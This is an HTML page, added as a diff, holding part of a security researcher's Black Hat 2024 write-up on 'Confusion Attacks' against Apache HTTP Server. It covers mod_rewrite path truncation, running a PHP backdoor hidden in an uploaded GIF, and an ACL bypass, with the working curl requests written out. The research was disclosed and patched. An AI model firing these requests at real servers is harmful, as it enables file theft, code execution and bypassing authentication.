@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="[ 繁體中文版本  |  English Version ]  Hey there! This is my research on Apache HTTP Server presented at Black Hat USA 2024. Additionally, this research will also be presented at HITCON and OrangeCon. If you">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!">
+<meta property="og:url" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="[ 繁體中文版本  |  English Version ]  Hey there! This is my research on Apache HTTP Server presented at Black Hat USA 2024. Additionally, this research will also be presented at HITCON and OrangeCon. If you">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/68a9e5dd90df580b-01.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/016234389a51f40b-02.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/cb68682cbd04105d-03.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/92f358a5ab548ae0-04.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/b891865923d68362-05.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/7ca2c0badb60f2df-06.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/59b47f0ae6d8d13b-07.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/9f927a5ccd4a2a69-08.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/0bc450787c481aef-09.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/dacded9bea644dff-10.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/c46787187d97fc85-11.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/444e2b7b11c6c80e-12.png">
+<meta property="article:published_time" content="2024-08-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T06:25:08.863Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-en/68a9e5dd90df580b-01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-08T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-08-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>[ <a href="https://blog.orange.tw/2024/08/confusion-attacks-ch.html">繁體中文版本</a>  |  <a href="https://blog.orange.tw/2024/08/confusion-attacks-en.html">English Version</a> ]</p>
+<p><img src="/posts/2024-08-confusion-attacks-en/68a9e5dd90df580b-01.png" alt="preview"></p>
+<p>Hey there! This is my research on Apache HTTP Server presented at <a target="_blank" rel="noopener" href="https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227">Black Hat USA 2024</a>. Additionally, this research will also be presented at <a target="_blank" rel="noopener" href="https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/">HITCON</a> and <a target="_blank" rel="noopener" href="https://orangecon.nl/">OrangeCon</a>. If you’re interested in getting a preview, you can check the slides here:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf">Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</a></p>
+</blockquote>
+<p>Also, I would like to thank Akamai for their friendly outreach! They released mitigation measures immediately after this research was published (details can be found on <a target="_blank" rel="noopener" href="https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore">Akamai’s blog</a>).</p>
+<h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><p>This article explores architectural issues within the Apache HTTP Server, highlighting several technical debts within Httpd, <strong>including 3 types of Confusion Attacks, 9 new vulnerabilities, 20 exploitation techniques, and over 30 case studies</strong>. The content includes, but is not limited to:</p>
+<ol>
+<li>How a single <code>?</code> can bypass Httpd’s built-in access control and authentication.</li>
+<li>How unsafe <code>RewriteRules</code> can escape the Web Root and access the entire filesystem.</li>
+<li>How to leverage a piece of code from 1996 to transform an XSS into RCE.</li>
+</ol>
+<h1 id="Outline"><a href="#Outline" class="headerlink" title="Outline"></a>Outline</h1><ul>
+<li><a href="#Before-the-Story">Before the Story</a></li>
+<li><a href="#How-Did-the-Story-Begin">How Did the Story Begin?</a></li>
+<li><a href="#Why-Apache-HTTP-Server-Smells-Bad">Why Apache HTTP Server Smells Bad?</a></li>
+<li><a href="#A-Whole-New-Attack-%E2%80%94-Confusion-Attack">A Whole New Attack — Confusion Attack</a><ul>
+<li><a href="#%F0%9F%94%A5-1-Filename-Confusion">1. Filename Confusion</a><ul>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-1-1-Truncation">Primitive 1-1. Truncation</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-1-1-1-Path-Truncation">1-1-1. Path Truncation</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-1-1-2-Mislead-RewriteFlag-Assignment">1-1-2. Mislead RewriteFlag Assignment</a></li>
+</ul>
+</li>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-1-2-ACL-Bypass">Primitive 1-2. ACL Bypass</a></li>
+</ul>
+</li>
+<li><a href="#%F0%9F%94%A5-2-DocumentRoot-Confusion">2. DocumentRoot Confusion</a><ul>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-2-1-Server-Side-Source-Code-Disclosure">Primitive 2-1. Server-Side Source Code Disclosure</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-1-1-Disclose-CGI-Source-Code">2-1-1. Disclose CGI Source Code</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-1-2-Disclose-PHP-Source-Code">2-1-2. Disclose PHP Source Code</a></li>
+</ul>
+</li>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-2-2-Local-Gadgets-Manipulation">Primitive 2-2. Local Gadgets Manipulation!</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-2-1-Local-Gadget-to-Information-Disclosure">2-2-1. Local Gadget to Information Disclosure</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-2-2-Local-Gadget-to-XSS">2-2-2. Local Gadget to XSS</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-2-3-Local-Gadget-to-LFI">2-2-3. Local Gadget to LFI</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-2-4-Local-Gadget-to-SSRF">2-2-4. Local Gadget to SSRF</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-2-5-Local-Gadget-to-RCE">2-2-5. Local Gadget to RCE</a></li>
+</ul>
+</li>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-2-3-Jailbreak-from-Local-Gadgets">Primitive 2-3. Jailbreak from Local Gadgets</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-3-1-Jailbreak-from-Local-Gadgets">2-3-1. Jailbreak from Local Gadgets</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE">2-3-2. Jailbreak Local Gadgets to Redmine RCE</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%F0%9F%94%A5-3-Handler-Confusion">3. Handler Confusion</a><ul>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-3-1-Overwrite-the-Handler">Primitive 3-1. Overwrite the Handler</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code">3-1-1. Overwrite Handler to Disclose PHP Source Code</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-1-2-Overwrite-Handler-to-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88">3-1-2. Overwrite Handler to ██████ ███████ ██████</a></li>
+</ul>
+</li>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-3-2-Invoke-Arbitrary-Handlers">Primitive 3-2. Invoke Arbitrary Handlers</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-2-1-Arbitrary-Handler-to-Information-Disclosure">3-2-1. Arbitrary Handler to Information Disclosure</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts">3-2-2. Arbitrary Handler to Misinterpret Scripts</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-2-2-Arbitrary-Handler-to-Full-SSRF">3-2-2. Arbitrary Handler to Full SSRF</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket">3-2-3. Arbitrary Handler to Access Local Unix Domain Socket</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-2-4-Arbitrary-Handler-to-RCE">3-2-4. Arbitrary Handler to RCE</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%F0%9F%94%A5-4-Other-Vulnerabilities">4. Other Vulnerabilities</a><ul>
+<li><a href="#%E2%9A%94%EF%B8%8F-CVE-2024-38472---Windows-UNC-based-SSRF">CVE-2024-38472 - Windows UNC-based SSRF</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-Triggered-via-HTTP-Request-Parser">Triggered via HTTP Request Parser</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-Triggered-via-Type-Map">Triggered via Type-Map</a></li>
+</ul>
+</li>
+<li><a href="#%E2%9A%94%EF%B8%8F-CVE-2024-39573---SSRF-via-Full-Control-of-RewriteRule-Prefix">CVE-2024-39573 - SSRF via Full Control of RewriteRule Prefix</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#Future-Works">Future Works</a></li>
+<li><a href="#Conclusion">Conclusion</a></li>
+</ul>
+<h1 id="Before-the-Story"><a href="#Before-the-Story" class="headerlink" title="Before the Story"></a>Before the Story</h1><p>This section is just some personal murmurs. If you’re only interested in the technical details, jump straight to — <a href="#How-Did-the-Story-Begin">How Did the Story Begin?</a></p>
+<p>As a researcher, perhaps the greatest joy is seeing your work recognized and understood by peers. Therefore, after completing a significant research with fruitful results, it is natural to want the world to see it — which is why I’ve presented multiple times at Black Hat USA and DEFCON. As you might know, since 2022, I have been unable to obtain a valid travel authorization to enter the U.S. (For Taiwan, travel authorization under the <a target="_blank" rel="noopener" href="https://esta.cbp.dhs.gov/">Visa Waiver Program</a> can typically be obtained online within minutes to hours), leading me to miss the in-person talk at <a target="_blank" rel="noopener" href="https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199">Black Hat USA 2022</a>. Even a solo trip to Machu Picchu and Easter Island in 2023 couldn’t transit through the U.S. :(</p>
+<p>To address this situation, I started preparing for a B1&#x2F;B2 visa in January this year, writing various documents, interviewing at the embassy, and endlessly waiting. It’s not fun. But to have my work seen, I still spent a lot of time seeking all possibilities, even until three weeks before the conference, it was unclear whether my talk would be canceled or not (BH only accepted in-person talks, but thanks to the RB, it could ultimately be presented in pre-recorded format). So, everything you see, including slides, videos, and this blog, was completed within just a few dozen days. 😖</p>
+<p>As a pure researcher with a clear conscience, my attitude towards vulnerabilities has always been — they should be directly reported to and fixed by the vendor. Writing these words isn’t for any particular reason, just to record some feelings of helplessness, efforts in this year, and to thank those who have helped me this year, thank you all :)</p>
+<h1 id="How-Did-the-Story-Begin"><a href="#How-Did-the-Story-Begin" class="headerlink" title="How Did the Story Begin?"></a>How Did the Story Begin?</h1><p>Around the beginning of this year, I started thinking about my next research target. As you might know, I always aim to challenge big targets that can impact the entire internet, so I began searching for some complex topics or interesting open-source projects like Nginx, PHP, or even delved into RFCs to strengthen my understanding of protocol details.</p>
+<p>While most attempts ended in failure (though a few might become topics for next blog posts 😉), reading these codes reminded me of a quick review I had done of Apache HTTP Server last year! Although I didn’t dive deep into the code due to the work schedule, I had already “smelled” something not quite right about its coding style at that time.</p>
+<p>So this year, I decided to continue on that research, transforming the “bad smells” from an indescribable “feeling” into concrete research on Apache HTTP Server!</p>
+<h1 id="Why-Apache-HTTP-Server-Smells-Bad"><a href="#Why-Apache-HTTP-Server-Smells-Bad" class="headerlink" title="Why Apache HTTP Server Smells Bad?"></a>Why Apache HTTP Server Smells Bad?</h1><p>Firstly, the Apache HTTP Server is a world constructed by “modules,” as proudly declared in its <a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/mpm.html">official documentation</a> regarding its modularity:</p>
+<blockquote>
+<p>Apache httpd has always accommodated a wide variety of environments through its modular design. […] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.</p>
+</blockquote>
+<p>The entire Httpd service relies on hundreds of small modules working together to handle a client’s HTTP request. <strong>Among the <a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/mod/">136 modules listed by the official documentation</a>, about half are either enabled by default or frequently used by websites</strong>!</p>
+<p>What’s even more surprising is that these modules also maintain a colossal <code>request_rec</code> structure while processing client HTTP requests. This structure includes all the elements involved in handling HTTP, with its detailed definition available in <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838">include&#x2F;httpd.h</a>. All modules depend on this massive structure for synchronization, communication, and data exchange. As an HTTP request passes through several phases, modules act like players in a game of catch, passing the structure from one to another. Each module even has the ability to modify any value in this structure according to its own preferences!</p>
+<p><img src="/posts/2024-08-confusion-attacks-en/016234389a51f40b-02.png"></p>
+<p>This type of collaboration is not new from a software engineering perspective. Each module simply focuses on its own task. As long as everyone finishes their work, then the client can enjoy the service provided by Httpd. This approach might work well with a few modules, <strong>but what happens when we scale it up to hundreds of modules collaborating — can they really work well together?</strong> 🤔</p>
+<p>Our starting point is straightforward — <strong>the modules do not fully understand each other, yet they are required to cooperate</strong>. Each module might be implemented by different people, with the code undergoing years of iterations, refactors, and modifications. Do they really still know what they are doing? Even if they understand their own duty, what about other modules’ implementation details? Without any good development standards or guidelines, there must be several gaps that we can exploit!</p>
+<h1 id="A-Whole-New-Attack-—-Confusion-Attack"><a href="#A-Whole-New-Attack-—-Confusion-Attack" class="headerlink" title="A Whole New Attack — Confusion Attack"></a>A Whole New Attack — Confusion Attack</h1><p>Based on these observations, we started <strong>focusing on the “relationships” and “interactions” among these modules</strong>. If a module accidentally modifies a structure field that it considers unimportant, but is crucial for another module, it could affect the latter’s decisions. Furthermore, if the definitions or semantics of the fields are not precise enough, causing ambiguities in how modules understand the same fields, it could lead to potential security risks as well!</p>
+<p>From this starting point, we developed three different types of attacks, as these attacks are more or less related to the misuse of structure fields. Hence, we’ve named this attack surface “Confusion Attack,” and the following are the attacks we developed:</p>
+<ol>
+<li><strong>Filename Confusion</strong></li>
+<li><strong>DocumentRoot Confusion</strong></li>
+<li><strong>Handler Confusion</strong></li>
+</ol>
+<p>Through these attacks, we have identified 9 different vulnerabilities:</p>
+<ol>
+<li><strong>CVE-2024-38472</strong> - Apache HTTP Server on Windows UNC SSRF</li>
+<li><strong>CVE-2024-39573</strong> - Apache HTTP Server proxy encoding problem</li>
+<li><strong>CVE-2024-38477</strong> - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request</li>
+<li><strong>CVE-2024-38476</strong> - Apache HTTP Server may use exploitable&#x2F;malicious backend application output to run local handlers via internal redirect</li>
+<li><strong>CVE-2024-38475</strong> - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path</li>
+<li><strong>CVE-2024-38474</strong> - Apache HTTP Server weakness with encoded question marks in backreferences</li>
+<li><strong>CVE-2024-38473</strong> - Apache HTTP Server proxy encoding problem</li>
+<li><strong>CVE-2023-38709</strong> - Apache HTTP Server: HTTP response splitting</li>
+<li><strong>CVE-2024-??????</strong> - [redacted]</li>
+</ol>
+<p>These vulnerabilities were reported through the official security mailing list and were addressed by the Apache HTTP Server in the <a target="_blank" rel="noopener" href="https://httpd.apache.org/security/vulnerabilities_24.html">2.4.60 update</a> published on 2024-07-01.</p>
+<p>As this is a new attack surface from Httpd’s architectural design and its internal mechanisms, naturally, <del>the first person to delve into it can find the most vulnerabilities. Thus, I currently hold the most CVEs from Apache HTTP Server 😉.</del> it leads to many updates that are not backward compatible. Therefore, patching these issues is not easy for many long-running production servers. If administrators update without careful consideration, they might disrupt existing configurations, causing service downtime. 😨</p>
+<p>Now, it’s time to get started with our Confusion Attacks! Are you ready?</p>
+<h2 id="🔥-1-Filename-Confusion"><a href="#🔥-1-Filename-Confusion" class="headerlink" title="🔥 1. Filename Confusion"></a>🔥 1. Filename Confusion</h2><p>The first issue stems from confusion regarding the filename field. Literally, <code>r-&gt;filename</code> should represent a filesystem path. However, in Apache HTTP Server, some modules treat it as a URL. If, within an HTTP context, most modules consider <code>r-&gt;filename</code> as a filesystem path but some others treat it as a URL, this inconsistency can lead to security issues!</p>
+<h3 id="⚔️-Primitive-1-1-Truncation"><a href="#⚔️-Primitive-1-1-Truncation" class="headerlink" title="⚔️ Primitive 1-1. Truncation"></a>⚔️ Primitive 1-1. Truncation</h3><p>So, which modules treat <code>r-&gt;filename</code> as a URL? The first is <code>mod_rewrite</code>, which allows sysadmins to easily rewrite a path pattern to a specified substitution target using the <code>RewriteRule</code> directive:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteRule</span> Pattern Substitution<span class="meta"> [flags]</span></span><br></pre></td></tr></table></figure>
+<p>The target can be either a filesystem path or a URL. This feature likely exists for user experience. However, this “convenience” also introduces risks. For instance, <strong>while rewriting the target paths, <code>mod_rewrite</code> forcefully treats all results as a URL</strong>, truncating the path after a question mark <code>%3F</code>. This leads to the following two exploitations.</p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141">modules&#x2F;mappers&#x2F;mod_rewrite.c#L4141</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Apply a single RewriteRule</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">apply_rewrite_rule</span><span class="params">(rewriterule_entry *p, rewrite_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ap_regmatch_t</span> regmatch[AP_MAX_REG_MATCH];</span><br><span class="line">    <span class="type">apr_array_header_t</span> *rewriteconds;</span><br><span class="line">    rewritecond_entry *conds;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rewriteconds-&gt;nelts; ++i) &#123;</span><br><span class="line">        rewritecond_entry *c = &amp;conds[i];</span><br><span class="line">        rc = apply_rewrite_cond(c, ctx);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// [...] do the remaining stuff</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Now adjust API&#x27;s knowledge about r-&gt;filename and r-&gt;args */</span></span><br><span class="line">    r-&gt;filename = newuri;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;perdir &amp;&amp; (p-&gt;flags &amp; RULEFLAG_DISCARDPATHINFO)) &#123;</span><br><span class="line">        r-&gt;path_info = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    splitout_queryargs(r, p-&gt;flags);         <span class="comment">// &lt;------- [!!!] Truncate the `r-&gt;filename`</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="✔️-1-1-1-Path-Truncation"><a href="#✔️-1-1-1-Path-Truncation" class="headerlink" title="✔️ 1-1-1. Path Truncation"></a>✔️ 1-1-1. Path Truncation</h4><p>The first primitive leverages this truncation on the filesystem path. Imagine the following <code>RewriteRule</code>:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span> <span class="string">&quot;^/user/(.+)$&quot;</span> <span class="string">&quot;/var/user/$1/profile.yml&quot;</span></span><br></pre></td></tr></table></figure>
+<p>The server would open the corresponding profile based on the username followed by the path <code>/user/</code>, for example:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/user/orange</span><br><span class="line"> <span class="comment"># the output of file `/var/user/orange/profile.yml`</span></span><br></pre></td></tr></table></figure>
+<p>Since <code>mod_rewrite</code> forcibly treats all rewritten result as a URL, even when the target is a filesystem path, it can be truncated at a question mark, cutting off the tailing <code>/profile.yml</code>, like:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/user/orange%2Fsecret.yml%3F</span><br><span class="line"> <span class="comment"># the output of file `/var/user/orange/secret.yml`</span></span><br></pre></td></tr></table></figure>
+<p>This is our first primitive — Path Truncation. Let’s pause our exploration of this primitive here for a moment. Although it might seem like a minor flaw for now, remember it— it will reappear in later attacks, gradually tearing open this seemingly little breach! 😜</p>
+<h4 id="✔️-1-1-2-Mislead-RewriteFlag-Assignment"><a href="#✔️-1-1-2-Mislead-RewriteFlag-Assignment" class="headerlink" title="✔️ 1-1-2. Mislead RewriteFlag Assignment"></a>✔️ 1-1-2. Mislead RewriteFlag Assignment</h4><p>The second exploitation of the truncation primitive is to mislead the assignment of <code>RewriteFlags</code>. Imagine a sysadmin managing websites and their corresponding handlers through the following <code>RewriteRule</code>:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span>  ^(.+\.php)$  $<span class="number">1</span> <span class="meta"> [H=application/x-httpd-php]</span></span><br></pre></td></tr></table></figure>
+<p>If a request ends with the <code>.php</code> extension, it adds the corresponding handler for the <code>mod_php</code> (this can also be an Environment Variable or Content-Type; you can refer to the official <a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/rewrite/flags.html">RewriteRule Flags</a> manual for details).</p>
+<p>Since the truncation behavior of the <code>mod_rewrite</code> occurs after the regular expression match, an attacker can use the original rule to apply flags to requests they shouldn’t apply to by using a <code>?</code>. For example, an attacker could upload a GIF image embedded with malicious PHP code and execute it as a backdoor through the following crafted request:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/upload/1.gif</span><br><span class="line"> <span class="comment"># GIF89a &lt;?=`id`;&gt;</span></span><br><span class="line"></span><br><span class="line">$ curl http://server/upload/1.gif%3fooo.php</span><br><span class="line"> <span class="comment"># GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br></pre></td></tr></table></figure>
+<h3 id="⚔️-Primitive-1-2-ACL-Bypass"><a href="#⚔️-Primitive-1-2-ACL-Bypass" class="headerlink" title="⚔️ Primitive 1-2. ACL Bypass"></a>⚔️ Primitive 1-2. ACL Bypass</h3><p>The second primitive of Filename Confusion occurs in the <code>mod_proxy</code>. Unlike the previous primitive which treats targets as a URL in all cases, this time <strong>the authentication and access control bypass is caused by the inconsistent semantic of <code>r-&gt;filename</code> among the modules!</strong></p>
+<p>It actually makes sense for the <code>mod_proxy</code> to treat <code>r-&gt;filename</code> as a URL, given that the primary purpose of a Proxy is to “redirect” requests to other URLs. However, security issues when different components interact — especially the case when most modules by default treat the <code>r-&gt;filename</code> as a filesystem path, imagine you use a file-based access control, and now <code>mod_proxy</code> treats <code>r-&gt;filename</code> as a URL; this inconsistency can lead to the access control or authentication bypass!</p>
+<p>A classic example is when sysadmins use the <code>Files</code> directive to restrict a single file, like <code>admin.php</code>:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Files <span class="string">&quot;admin.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">AuthType</span> Basic </span><br><span class="line">    <span class="attribute">AuthName</span> <span class="string">&quot;Admin Panel&quot;</span></span><br><span class="line">    <span class="attribute">AuthUserFile</span> <span class="string">&quot;/etc/apache2/.htpasswd&quot;</span></span><br><span class="line">    <span class="attribute">Require</span> valid-user</span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
+<p>This type of configuration can be bypassed directly under the default PHP-FPM installation! It’s also worth mentioning that this is one of the most common ways to configure authentication in Apache HTTP Server! Suppose you visit a URL like this:</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;admin.php%3Fooo.php</p>
+</blockquote>
